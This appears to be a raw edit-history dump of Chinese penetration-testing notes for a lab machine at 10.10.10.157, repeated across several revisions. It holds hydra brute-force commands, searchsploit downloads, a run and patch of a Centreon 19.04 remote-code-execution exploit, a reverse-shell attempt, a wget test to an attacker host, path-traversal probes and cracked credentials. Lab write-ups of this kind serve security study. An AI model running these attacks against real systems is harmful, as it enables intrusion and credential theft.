"],[1,5706,"\n"],[1,5778,"\r"],[-1,5778,"e\n"]],[5782,5782],[4950,4950]]],[1569656850020,["whale@Whale",[[-1,5706,"80][http-post-form] host: 10.10.10.157   login: admin   password: justice"]],[5706,5779],[5706,5706]]],[1569656850583,["whale@Whale",[[-1,5706,"\n"]],[5706,5706],[5705,5705]]],[1569656856488,["whale@Whale",[[1,5705,"admin/password1"]],[5705,5705],[5720,5720]]],[1569663654050,[null,[[-1,4950,"  "],[1,4984,"  "],[-1,5222,"  "],[1,5232,"  "]],[4950,4950],[5234,5234]]],[1569663654050,[null,[[1,4950,"  "],[-1,4982,"  "],[1,5222,"  "],[-1,5230,"  "]],[5234,5234],[4950,4950]]],[1569663617963,["whale@Whale",[[-1,5470,"root"],[1,5474,"admin"]],[5470,5474],[5475,5475]]],[1569663649955,["whale@Whale",[[1,5704," -t 4"]],[5461,5705],[5709,5709]]],[1569664678033,[null,[[-1,4950,"  "],[1,4984,"  "],[-1,5222,"  "],[1,5232,"  "]],[4950,4950],[5234,5234]]],[1569664678034,[null,[[1,4950,"  "],[-1,4982,"  "],[1,5222,"  "],[-1,5230,"  "]],[5234,5234],[4950,4950]]],[1569664637681,["whale@Whale",[[1,5744,"\n"]],[5743,5743],[5744,5744]]],[1569664637870,["whale@Whale",[[1,5745,"\n"]],[5744,5744],[5745,5745]]],[1569664638755,["whale@Whale",[[-1,5745,"\n"],[1,5746,"ch"]],[5745,5745],[5747,5747]]],[1569664639291,["whale@Whale",[[-1,5745,"ch"]],[5747,5747],[5745,5745]]],[1569664640083,["whale@Whale",[[1,5745,"\n\n"]],[5745,5745],[5746,5746]]],[1569664640602,["whale@Whale",[[-1,5746,"\n"]],[5746,5746],[5745,5745]]],[1569664645681,["whale@Whale",[[-1,5745,"\n"],[1,5746,"触及到了防火墙"]],[5745,5745],[5752,5752]]]]],["00a916d4-04ac-4f26-b840-f6bbe50d0bfe",1570114367502,"157\n===\n参考资料：[http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/](http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/)\n\n22，80\n\nApache/2.4.29 (Ubuntu) Server \n\n![1]($res/1.PNG)\n说明用户名可能是admin\n\ncd /usr/share/wordlists\n hydra -l admin -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring\n\n hydra -l admin -P 3000-pass.txt -s 80 -f 10.10.10.157 http-get /monitoring\n hydra -l panel -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring\n hydra -l aa -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring\n\n## ssh\nOpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n\n![6]($res/6.PNG)\n\n---\nsearchsploit -m exploits/linux/remote/45233.py\npython 45233.py（type error代码错误）\n\nsearchsploit -m exploits/linux/remote/45210.py\npython 45210.py (TypeError)\n\nsearchsploit -m exploits/linux/remote/45939.py\npython 45939.py --port 22 10.10.10.157 root（TypeError: an integer is required）\n\n---\nhydra -l admin -P rockyou.txt 10.10.10.157 ssh\n\n## web\ndirb http://10.10.10.157 -X .php\n存在的目录\nhttp://10.10.10.157/aa.php\nhttp://10.10.10.157/monitoring/\nhttp://10.10.10.157/panel.php\ns....-s....\ncentreon\n\nnikto -h http://10.10.10.157\nGET, POST, OPTIONS, HEAD \n\n---\n10.10.10.157/monitoring/../panel.php\n跳转到panel.php\n\n10.10.10.157/monitoring/../../../../../../../../../etc/passwd\n无效\n\n---\n\nThat is correct, no need for any creds if all you currentl see is m********, a*.php, and p******.php\n\nIf you are having trouble finding a thing past the regular dirb stuff, I suppose the right dictionary list would help, but you really only need to consider a couple of verbs.\n\n![7]($res/7.PNG)\nsearchsploit centreon\nsearchsploit -m exploitdb/exploits/php/webapps/47069.py\nv. 19.04.0\n\n参考资料：[https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/](https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/)\n\n![8]($res/8.PNG)\n\n![9]($res/9.PNG)\n\npython3.6 47069.py http://10.10.10.157/centreon admin passwd 10.10.14.10 1330\n\n```\n[+] Retrieving CSRF token to submit the login form\n47069.py:38: UserWarning: No parser was explicitly specified, so I'm using the best available HTML parser for this system (\"lxml\"). This usually isn't a problem, but if you run this code on another system, or in a different virtual environment, it may use a different parser and behave differently.\n\nThe code that caused this warning is on line 38 of the file 47069.py. To get rid of this warning, pass the additional argument 'features=\"lxml\"' to the BeautifulSoup constructor.\n\n  soup = BeautifulSoup(html_content)\n[+] Login token is : 184639f4656756696eb3efd175cdee66\n[+] Logged In Sucssfully\n[+] Retrieving Poller token\n47069.py:56: UserWarning: No parser was explicitly specified, so I'm using the best available HTML parser for this system (\"lxml\"). This usually isn't a problem, but if you run this code on another system, or in a different virtual environment, it may use a different parser and behave differently.\n\nThe code that caused this warning is on line 56 of the file 47069.py. To get rid of this warning, pass the additional argument 'features=\"lxml\"' to the BeautifulSoup constructor.\n\n  poller_soup = BeautifulSoup(poller_html)\nTraceback (most recent call last):\n  File \"47069.py\", line 57, in <module>\n    poller_token = poller_soup.findAll('input')[24].get(\"value\")\nIndexError: list index out of range\n\n```\n\n![10]($res/10.PNG)\n\npoller_token = poller_soup.find('input', {'name': 'centreon_token'}).get('value')\n\n![11]($res/11.PNG)\n\nexp:[https://gist.githubusercontent.com/mhaskar/c4255f6cf45b19b8a852c780f50576da/raw/f50ab5b4582986ca595055e53417bc2dfce1838e/centreon-exploit.py](https://gist.githubusercontent.com/mhaskar/c4255f6cf45b19b8a852c780f50576da/raw/f50ab5b4582986ca595055e53417bc2dfce1838e/centreon-exploit.py)\n\npython3 centreon-exploit.py http://10.10.10.157/centreon admin passwd 10.10.14.10 1234\n\n反弹shell失败\n\n---\nhttp://10.10.10.157/centreon/Themes/Centreon-2/\n\n![12]($res/12.PNG)\n目录遍历漏洞\n\n2\\. API is never worthless\n3.CVE x2\n\n---\n+ http://10.10.10.157/centreon/a.php (CODE:200|SIZE:1)                                                   \n+ http://10.10.10.157/centreon/index.php (CODE:200|SIZE:3091)                                            \n+ http://10.10.10.157/centreon/main.php (CODE:302|SIZE:0)   \nhttp://10.10.10.157/centreon/main.php?p=60901&o=c&server_id=1\nhttp://10.10.10.157/centreon/include/configuration/configGenerate/xml/generateFiles.php\n\n---\n\n19.04 版本漏洞\n[https://www.cvedetails.com/vulnerability-list/vendor_id-7565/product_id-12778/version_id-303583/Centreon-Centreon-19.04.0.html](https://www.cvedetails.com/vulnerability-list/vendor_id-7565/product_id-12778/version_id-303583/Centreon-Centreon-19.04.0.html)\n\nCookie: PHPSESSID=smg43q7s4sc1cmd1p5c5qaf3qm\n\nredirect=%27%27&useralias=admin&password=passwd&submitLogin=Connect&centreon_token=63e8a72514a7cb7f6c463d5afefb3784\n\n---\n测试命令执行是否成功，修改payload为\n```\nwget http://10.10.14.10:888/1.txt #\n```\n失败\n![13]($res/13.PNG)\n\n---\n\nhydra -L /usr/share/wordlists/rockyou.txt  -P /usr/share/wordlists/rockyou.txt -V -s 80 10.10.10.157 http-post-form \"/centreon/index.php:useralias=^USER^&password=^PASS^&submitLogin=Connect&centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.\"\n\nhydra -l centreon  -P /usr/share/wordlists/rockyou.txt -V -s 80 10.10.10.157 http-post-form \"/centreon/index.php:useralias=^USER^&password=^PASS^&submitLogin=Connect&centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.\"\n\nhydra -l admin  -P /usr/share/wordlists/rockyou.txt -V -s 80 10.10.10.157 http-post-form \"/centreon/index.php:useralias=^USER^&password=^PASS^&submitLogin=Connect&centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.\" -t 4\n\nadmin/password1\ncentreon/#1bitch\n\n触及到了防火墙",[[1570114308787,["whale@Whale",[[1,145,"\n"]],[144,144],[145,145]]],[1570114314381,["whale@Whale",[[1,145,"## enumeration"]],[145,145],[159,159]]],[1570114338852,["whale@Whale",[[-1,1317,"That is correct, no need for any creds if all you currentl see is m********, a*.php, and p******.php\n\nIf you are having trouble finding a thing past the regular dirb stuff, I suppose the right dictionary list would help, but you really only need to consider a couple of verbs.\n"]],[1317,1594],[1317,1317]]],[1570114339542,["whale@Whale",[[-1,1317,"\n"]],[1317,1317],[1316,1316]]],[1570114339843,["whale@Whale",[[-1,1316,"\n"]],[1316,1316],[1315,1315]]],[1570114340550,["whale@Whale",[[1,1316,"\n"]],[1315,1315],[1316,1316]]],[1570114752067,["whale@Whale",[[1,1316,"z"]],[1316,1316],[1317,1317]]],[1570114756796,["whale@Whale",[[-1,1316,"z"]],[1317,1317],[1316,1316]]],[1570114812301,["whale@Whale",[[1,5489,"\n\n"]],[5489,5489],[5490,5490]]],[1570114812485,["whale@Whale",[[1,5491,"\n"]],[5490,5490],[5491,5491]]],[1570114817913,["whale@Whale",[[-1,5491,"\n"],[1,5492,"## c"]],[5491,5491],[5495,5495]]],[1570114819077,["whale@Whale",[[-1,5494,"c"]],[5495,5495],[5494,5494]]],[1570114821749,["whale@Whale",[[1,5494,"存在的漏洞"]],[5494,5494],[5499,5499]]],[1570114821918,["whale@Whale",[[1,5499,"\n\n"]],[5499,5499],[5500,5500]]],[1570114907173,["whale@Whale",[[1,5501,"19.04 版本漏洞\n"]],[5500,5500],[5511,5511]]],[1570114913958,["whale@Whale",[[1,5501,"centreon "]],[5501,5501],[5510,5510]]],[1570115172644,["whale@Whale",[[1,5521,"\n"]],[5520,5520],[5521,5521]]],[1570115175232,["whale@Whale",[[1,5521,"apache目录遍历"]],[5521,5521],[5531,5531]]],[1570115581441,["whale@Whale",[[1,5520," "]],[5520,5520],[5521,5521]]]]],["cabab29d-1be0-4cfb-98ee-7f598f38ceb6",1570185748404,"157\n===\n参考资料：[http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/](http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/)\n\n## enumeration\n22，80\n\nApache/2.4.29 (Ubuntu) Server \n\n![1]($res/1.PNG)\n说明用户名可能是admin\n\ncd /usr/share/wordlists\n hydra -l admin -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring\n\n hydra -l admin -P 3000-pass.txt -s 80 -f 10.10.10.157 http-get /monitoring\n hydra -l panel -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring\n hydra -l aa -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring\n\n## ssh\nOpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n\n![6]($res/6.PNG)\n\n---\nsearchsploit -m exploits/linux/remote/45233.py\npython 45233.py（type error代码错误）\n\nsearchsploit -m exploits/linux/remote/45210.py\npython 45210.py (TypeError)\n\nsearchsploit -m exploits/linux/remote/45939.py\npython 45939.py --port 22 10.10.10.157 root（TypeError: an integer is required）\n\n---\nhydra -l admin -P rockyou.txt 10.10.10.157 ssh\n\n## web\ndirb http://10.10.10.157 -X .php\n存在的目录\nhttp://10.10.10.157/aa.php\nhttp://10.10.10.157/monitoring/\nhttp://10.10.10.157/panel.php\ns....-s....\ncentreon\n\nnikto -h http://10.10.10.157\nGET, POST, OPTIONS, HEAD \n\n---\n10.10.10.157/monitoring/../panel.php\n跳转到panel.php\n\n10.10.10.157/monitoring/../../../../../../../../../etc/passwd\n无效\n\n---\n\n![7]($res/7.PNG)\nsearchsploit centreon\nsearchsploit -m exploitdb/exploits/php/webapps/47069.py\nv. 19.04.0\n\n参考资料：[https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/](https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/)\n\n![8]($res/8.PNG)\n\n![9]($res/9.PNG)\n\npython3.6 47069.py http://10.10.10.157/centreon admin passwd 10.10.14.10 1330\n\n```\n[+] Retrieving CSRF token to submit the login form\n47069.py:38: UserWarning: No parser was explicitly specified, so I'm using the best available HTML parser for this system (\"lxml\"). This usually isn't a problem, but if you run this code on another system, or in a different virtual environment, it may use a different parser and behave differently.\n\nThe code that caused this warning is on line 38 of the file 47069.py. To get rid of this warning, pass the additional argument 'features=\"lxml\"' to the BeautifulSoup constructor.\n\n  soup = BeautifulSoup(html_content)\n[+] Login token is : 184639f4656756696eb3efd175cdee66\n[+] Logged In Sucssfully\n[+] Retrieving Poller token\n47069.py:56: UserWarning: No parser was explicitly specified, so I'm using the best available HTML parser for this system (\"lxml\"). This usually isn't a problem, but if you run this code on another system, or in a different virtual environment, it may use a different parser and behave differently.\n\nThe code that caused this warning is on line 56 of the file 47069.py. To get rid of this warning, pass the additional argument 'features=\"lxml\"' to the BeautifulSoup constructor.\n\n  poller_soup = BeautifulSoup(poller_html)\nTraceback (most recent call last):\n  File \"47069.py\", line 57, in <module>\n    poller_token = poller_soup.findAll('input')[24].get(\"value\")\nIndexError: list index out of range\n\n```\n\n![10]($res/10.PNG)\n\npoller_token = poller_soup.find('input', {'name': 'centreon_token'}).get('value')\n\n![11]($res/11.PNG)\n\nexp:[https://gist.githubusercontent.com/mhaskar/c4255f6cf45b19b8a852c780f50576da/raw/f50ab5b4582986ca595055e53417bc2dfce1838e/centreon-exploit.py](https://gist.githubusercontent.com/mhaskar/c4255f6cf45b19b8a852c780f50576da/raw/f50ab5b4582986ca595055e53417bc2dfce1838e/centreon-exploit.py)\n\npython3 centreon-exploit.py http://10.10.10.157/centreon admin passwd 10.10.14.10 1234\n\n反弹shell失败\n\n---\nhttp://10.10.10.157/centreon/Themes/Centreon-2/\n\n![12]($res/12.PNG)\n目录遍历漏洞\n\n2\\. API is never worthless\n3.CVE x2\n\n---\n+ http://10.10.10.157/centreon/a.php (CODE:200|SIZE:1)                                                   \n+ http://10.10.10.157/centreon/index.php (CODE:200|SIZE:3091)                                            \n+ http://10.10.10.157/centreon/main.php (CODE:302|SIZE:0)   \nhttp://10.10.10.157/centreon/main.php?p=60901&o=c&server_id=1\nhttp://10.10.10.157/centreon/include/configuration/configGenerate/xml/generateFiles.php\n\n---\n\n19.04 版本漏洞\n[https://www.cvedetails.com/vulnerability-list/vendor_id-7565/product_id-12778/version_id-303583/Centreon-Centreon-19.04.0.html](https://www.cvedetails.com/vulnerability-list/vendor_id-7565/product_id-12778/version_id-303583/Centreon-Centreon-19.04.0.html)\n\nCookie: PHPSESSID=smg43q7s4sc1cmd1p5c5qaf3qm\n\nredirect=%27%27&useralias=admin&password=passwd&submitLogin=Connect&centreon_token=63e8a72514a7cb7f6c463d5afefb3784\n\n---\n测试命令执行是否成功，修改payload为\n```\nwget http://10.10.14.10:888/1.txt #\n```\n失败\n![13]($res/13.PNG)\n\n---\n\nhydra -L /usr/share/wordlists/rockyou.txt  -P /usr/share/wordlists/rockyou.txt -V -s 80 10.10.10.157 http-post-form \"/centreon/index.php:useralias=^USER^&password=^PASS^&submitLogin=Connect&centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.\"\n\nhydra -l centreon  -P /usr/share/wordlists/rockyou.txt -V -s 80 10.10.10.157 http-post-form \"/centreon/index.php:useralias=^USER^&password=^PASS^&submitLogin=Connect&centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.\"\n\nhydra -l admin  -P /usr/share/wordlists/rockyou.txt -V -s 80 10.10.10.157 http-post-form \"/centreon/index.php:useralias=^USER^&password=^PASS^&submitLogin=Connect&centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.\" -t 4\n\nadmin/password1\ncentreon/#1bitch\n\n触及到了防火墙\n\n## 存在的漏洞\n\ncentreon 19.04 版本漏洞 \napache目录遍历\n",[[1570185696394,["whale@Whale",[[1,5532,"。"]],[5532,5532],[5533,5533]]],[1570190025056,["whale@Whale",[[-1,5515," 版本漏洞 "]],[5521,5521],[5515,5515]]],[1570190026942,["whale@Whale",[[1,5515," rce"]],[5515,5515],[5519,5519]]],[1570199019732,["whale@Whale",[[-1,1683," "]],[1684,1684],[1683,1683]]],[1570199021594,["whale@Whale",[[1,1683," "]],[1683,1683],[1684,1684]]]]],["c1e9acb1-30cd-4d90-a131-d7a2cf198fa5",1570330435087,"157\n===\n参考资料：[http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/](http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/)\n\n## enumeration\n22，80\n\nApache/2.4.29 (Ubuntu) Server \n\n![1]($res/1.PNG)\n说明用户名可能是admin\n\ncd /usr/share/wordlists\n hydra -l admin -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring\n\n hydra -l admin -P 3000-pass.txt -s 80 -f 10.10.10.157 http-get /monitoring\n hydra -l panel -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring\n hydra -l aa -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring\n\n## ssh\nOpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n\n![6]($res/6.PNG)\n\n---\nsearchsploit -m exploits/linux/remote/45233.py\npython 45233.py（type error代码错误）\n\nsearchsploit -m exploits/linux/remote/45210.py\npython 45210.py (TypeError)\n\nsearchsploit -m exploits/linux/remote/45939.py\npython 45939.py --port 22 10.10.10.157 root（TypeError: an integer is required）\n\n---\nhydra -l admin -P rockyou.txt 10.10.10.157 ssh\n\n## web\ndirb http://10.10.10.157 -X .php\n存在的目录\nhttp://10.10.10.157/aa.php\nhttp://10.10.10.157/monitoring/\nhttp://10.10.10.157/panel.php\ns....-s....\ncentreon\n\nnikto -h http://10.10.10.157\nGET, POST, OPTIONS, HEAD \n\n---\n10.10.10.157/monitoring/../panel.php\n跳转到panel.php\n\n10.10.10.157/monitoring/../../../../../../../../../etc/passwd\n无效\n\n---\n\n![7]($res/7.PNG)\nsearchsploit centreon\nsearchsploit -m exploitdb/exploits/php/webapps/47069.py\nv. 19.04.0\n\n参考资料：[https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/](https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/)\n\n![8]($res/8.PNG)\n\n![9]($res/9.PNG)\n\npython3.6 47069.py http://10.10.10.157/centreon admin passwd 10.10.14.10 1330\n\n```\n[+] Retrieving CSRF token to submit the login form\n47069.py:38: UserWarning: No parser was explicitly specified, so I'm using the best available HTML parser for this system (\"lxml\"). This usually isn't a problem, but if you run this code on another system, or in a different virtual environment, it may use a different parser and behave differently.\n\nThe code that caused this warning is on line 38 of the file 47069.py. To get rid of this warning, pass the additional argument 'features=\"lxml\"' to the BeautifulSoup constructor.\n\n  soup = BeautifulSoup(html_content)\n[+] Login token is : 184639f4656756696eb3efd175cdee66\n[+] Logged In Sucssfully\n[+] Retrieving Poller token\n47069.py:56: UserWarning: No parser was explicitly specified, so I'm using the best available HTML parser for this system (\"lxml\"). This usually isn't a problem, but if you run this code on another system, or in a different virtual environment, it may use a different parser and behave differently.\n\nThe code that caused this warning is on line 56 of the file 47069.py. To get rid of this warning, pass the additional argument 'features=\"lxml\"' to the BeautifulSoup constructor.\n\n  poller_soup = BeautifulSoup(poller_html)\nTraceback (most recent call last):\n  File \"47069.py\", line 57, in <module>\n    poller_token = poller_soup.findAll('input')[24].get(\"value\")\nIndexError: list index out of range\n\n```\n\n![10]($res/10.PNG)\n\npoller_token = poller_soup.find('input', {'name': 'centreon_token'}).get('value')\n\n![11]($res/11.PNG)\n\nexp:[https://gist.githubusercontent.com/mhaskar/c4255f6cf45b19b8a852c780f50576da/raw/f50ab5b4582986ca595055e53417bc2dfce1838e/centreon-exploit.py](https://gist.githubusercontent.com/mhaskar/c4255f6cf45b19b8a852c780f50576da/raw/f50ab5b4582986ca595055e53417bc2dfce1838e/centreon-exploit.py)\n\npython3 centreon-exploit.py http://10.10.10.157/centreon admin passwd 10.10.14.10 1234\n\n反弹shell失败\n\n---\nhttp://10.10.10.157/centreon/Themes/Centreon-2/\n\n![12]($res/12.PNG)\n目录遍历漏洞\n\n2\\. API is never worthless\n3.CVE x2\n\n---\n+ http://10.10.10.157/centreon/a.php (CODE:200|SIZE:1)                                                   \n+ http://10.10.10.157/centreon/index.php (CODE:200|SIZE:3091)                                            \n+ http://10.10.10.157/centreon/main.php (CODE:302|SIZE:0)   \nhttp://10.10.10.157/centreon/main.php?p=60901&o=c&server_id=1\nhttp://10.10.10.157/centreon/include/configuration/configGenerate/xml/generateFiles.php\n\n---\n\n19.04 版本漏洞\n[https://www.cvedetails.com/vulnerability-list/vendor_id-7565/product_id-12778/version_id-303583/Centreon-Centreon-19.04.0.html](https://www.cvedetails.com/vulnerability-list/vendor_id-7565/product_id-12778/version_id-303583/Centreon-Centreon-19.04.0.html)\n\nCookie: PHPSESSID=smg43q7s4sc1cmd1p5c5qaf3qm\n\nredirect=%27%27&useralias=admin&password=passwd&submitLogin=Connect&centreon_token=63e8a72514a7cb7f6c463d5afefb3784\n\n---\n测试命令执行是否成功，修改payload为\n```\nwget http://10.10.14.10:888/1.txt #\n```\n失败\n![13]($res/13.PNG)\n\n---\n\nhydra -L /usr/share/wordlists/rockyou.txt  -P /usr/share/wordlists/rockyou.txt -V -s 80 10.10.10.157 http-post-form \"/centreon/index.php:useralias=^USER^&password=^PASS^&submitLogin=Connect&centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.\"\n\nhydra -l centreon  -P /usr/share/wordlists/rockyou.txt -V -s 80 10.10.10.157 http-post-form \"/centreon/index.php:useralias=^USER^&password=^PASS^&submitLogin=Connect&centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.\"\n\nhydra -l admin  -P /usr/share/wordlists/rockyou.txt -V -s 80 10.10.10.157 http-post-form \"/centreon/index.php:useralias=^USER^&password=^PASS^&submitLogin=Connect&centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.\" -t 4\n\nadmin/password1\ncentreon/#1bitch\n\n触及到了防火墙\n\n## 存在的漏洞\n\ncentreon 19.04 rce\napache目录遍历。\n",[[1570330394920,["whale@Whale",[[1,1683,"1"]],[1683,1683],[1684,1684]]]]],["b178dfdf-0c3d-498c-b3f3-80b0ef253a49",1570343081021,"157\n===\n参考资料：[http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/](http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/)\n\n## enumeration\n22，80\n\nApache/2.4.29 (Ubuntu) Server \n\n![1]($res/1.PNG)\n说明用户名可能是admin\n\ncd /usr/share/wordlists\n hydra -l admin -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring\n\n hydra -l admin -P 3000-pass.txt -s 80 -f 10.10.10.157 http-get /monitoring\n hydra -l panel -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring\n hydra -l aa -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring\n\n## ssh\nOpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n\n![6]($res/6.PNG)\n\n---\nsearchsploit -m exploits/linux/remote/45233.py\npython 45233.py（type error代码错误）\n\nsearchsploit -m exploits/linux/remote/45210.py\npython 45210.py (TypeError)\n\nsearchsploit -m exploits/linux/remote/45939.py\npython 45939.py --port 22 10.10.10.157 root（TypeError: an integer is required）\n\n---\nhydra -l admin -P rockyou.txt 10.10.10.157 ssh\n\n## web\ndirb http://10.10.10.157 -X .php\n存在的目录\nhttp://10.10.10.157/aa.php\nhttp://10.10.10.157/monitoring/\nhttp://10.10.10.157/panel.php\ns....-s....\ncentreon\n\nnikto -h http://10.10.10.157\nGET, POST, OPTIONS, HEAD \n\n---\n10.10.10.157/monitoring/../panel.php\n跳转到panel.php\n\n10.10.10.157/monitoring/../../../../../../../../../etc/passwd\n无效\n\n---\n\n![7]($res/7.PNG)\nsearchsploit centreon\nsearchsploit -m exploitdb/exploits/php/webapps/47069.py\nv. 19.04.0\n\n参考资料：[https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/](https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/)\n\n![8]($res/8.PNG)\n\n![9]($res/9.PNG)\n\npython3.6 47069.py http://10.10.10.157/centreon admin passwd1 10.10.14.10 1330\n\n```\n[+] Retrieving CSRF token to submit the login form\n47069.py:38: UserWarning: No parser was explicitly specified, so I'm using the best available HTML parser for this system (\"lxml\"). This usually isn't a problem, but if you run this code on another system, or in a different virtual environment, it may use a different parser and behave differently.\n\nThe code that caused this warning is on line 38 of the file 47069.py. To get rid of this warning, pass the additional argument 'features=\"lxml\"' to the BeautifulSoup constructor.\n\n  soup = BeautifulSoup(html_content)\n[+] Login token is : 184639f4656756696eb3efd175cdee66\n[+] Logged In Sucssfully\n[+] Retrieving Poller token\n47069.py:56: UserWarning: No parser was explicitly specified, so I'm using the best available HTML parser for this system (\"lxml\"). This usually isn't a problem, but if you run this code on another system, or in a different virtual environment, it may use a different parser and behave differently.\n\nThe code that caused this warning is on line 56 of the file 47069.py. To get rid of this warning, pass the additional argument 'features=\"lxml\"' to the BeautifulSoup constructor.\n\n  poller_soup = BeautifulSoup(poller_html)\nTraceback (most recent call last):\n  File \"47069.py\", line 57, in <module>\n    poller_token = poller_soup.findAll('input')[24].get(\"value\")\nIndexError: list index out of range\n\n```\n\n![10]($res/10.PNG)\n\npoller_token = poller_soup.find('input', {'name': 'centreon_token'}).get('value')\n\n![11]($res/11.PNG)\n\nexp:[https://gist.githubusercontent.com/mhaskar/c4255f6cf45b19b8a852c780f50576da/raw/f50ab5b4582986ca595055e53417bc2dfce1838e/centreon-exploit.py](https://gist.githubusercontent.com/mhaskar/c4255f6cf45b19b8a852c780f50576da/raw/f50ab5b4582986ca595055e53417bc2dfce1838e/centreon-exploit.py)\n\npython3 centreon-exploit.py http://10.10.10.157/centreon admin passwd 10.10.14.10 1234\n\n反弹shell失败\n\n---\nhttp://10.10.10.157/centreon/Themes/Centreon-2/\n\n![12]($res/12.PNG)\n目录遍历漏洞\n\n2\\. API is never worthless\n3.CVE x2\n\n---\n+ http://10.10.10.157/centreon/a.php (CODE:200|SIZE:1)                                                   \n+ http://10.10.10.157/centreon/index.php (CODE:200|SIZE:3091)                                            \n+ http://10.10.10.157/centreon/main.php (CODE:302|SIZE:0)   \nhttp://10.10.10.157/centreon/main.php?p=60901&o=c&server_id=1\nhttp://10.10.10.157/centreon/include/configuration/configGenerate/xml/generateFiles.php\n\n---\n\n19.04 版本漏洞\n[https://www.cvedetails.com/vulnerability-list/vendor_id-7565/product_id-12778/version_id-303583/Centreon-Centreon-19.04.0.html](https://www.cvedetails.com/vulnerability-list/vendor_id-7565/product_id-12778/version_id-303583/Centreon-Centreon-19.04.0.html)\n\nCookie: PHPSESSID=smg43q7s4sc1cmd1p5c5qaf3qm\n\nredirect=%27%27&useralias=admin&password=passwd&submitLogin=Connect&centreon_token=63e8a72514a7cb7f6c463d5afefb3784\n\n---\n测试命令执行是否成功，修改payload为\n```\nwget http://10.10.14.10:888/1.txt #\n```\n失败\n![13]($res/13.PNG)\n\n---\n\nhydra -L /usr/share/wordlists/rockyou.txt  -P /usr/share/wordlists/rockyou.txt -V -s 80 10.10.10.157 http-post-form \"/centreon/index.php:useralias=^USER^&password=^PASS^&submitLogin=Connect&centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.\"\n\nhydra -l centreon  -P /usr/share/wordlists/rockyou.txt -V -s 80 10.10.10.157 http-post-form \"/centreon/index.php:useralias=^USER^&password=^PASS^&submitLogin=Connect&centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.\"\n\nhydra -l admin  -P /usr/share/wordlists/rockyou.txt -V -s 80 10.10.10.157 http-post-form \"/centreon/index.php:useralias=^USER^&password=^PASS^&submitLogin=Connect&centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.\" -t 4\n\nadmin/password1\ncentreon/#1bitch\n\n触及到了防火墙\n\n## 存在的漏洞\n\ncentreon 19.04 rce\napache目录遍历。\n",[[1570343031135,["whale@Whale",[[1,985,"\n"]],[984,984],[985,985]]],[1570343031157,["whale@Whale",[[1,986,"\n"]],[985,985],[986,986]]],[1570343037723,["whale@Whale",[[1,986,"### enumeration"]],[986,986],[1001,1001]]]]],["50ac8489-5c62-4caf-a1b8-23df1430dd0e",1570371649031,"157\n===\n参考资料：[http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/](http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/)\n\n## enumeration\n22，80\n\nApache/2.4.29 (Ubuntu) Server \n\n![1]($res/1.PNG)\n说明用户名可能是admin\n\ncd /usr/share/wordlists\n hydra -l admin -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring\n\n hydra -l admin -P 3000-pass.txt -s 80 -f 10.10.10.157 http-get /monitoring\n hydra -l panel -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring\n hydra -l aa -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring\n\n## ssh\nOpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n\n![6]($res/6.PNG)\n\n---\nsearchsploit -m exploits/linux/remote/45233.py\npython 45233.py（type error代码错误）\n\nsearchsploit -m exploits/linux/remote/45210.py\npython 45210.py (TypeError)\n\nsearchsploit -m exploits/linux/remote/45939.py\npython 45939.py --port 22 10.10.10.157 root（TypeError: an integer is required）\n\n---\nhydra -l admin -P rockyou.txt 10.10.10.157 ssh\n\n## web\n\n### enumeration\ndirb http://10.10.10.157 -X .php\n存在的目录\nhttp://10.10.10.157/aa.php\nhttp://10.10.10.157/monitoring/\nhttp://10.10.10.157/panel.php\ns....-s....\ncentreon\n\nnikto -h http://10.10.10.157\nGET, POST, OPTIONS, HEAD 